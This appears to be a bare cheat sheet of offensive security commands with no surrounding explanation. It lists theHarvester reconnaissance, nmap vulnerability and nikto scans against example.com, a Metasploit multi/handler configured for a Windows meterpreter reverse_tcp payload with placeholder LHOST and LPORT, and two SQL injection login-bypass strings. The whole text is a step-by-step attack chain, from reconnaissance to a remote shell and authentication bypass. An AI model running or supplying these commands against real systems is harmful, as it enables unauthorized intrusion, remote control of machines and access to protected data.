theharvester -d example.com -l 500 -b google
nmap --script vuln example.com
nikto -h http://example.com
msfconsole
use exploit/multi/handler
set payload windows/meterpreter/reverse_tcp
set LHOST <your_IP>
set LPORT <port>
exploit
' OR '1'='1
' OR 1=1 --
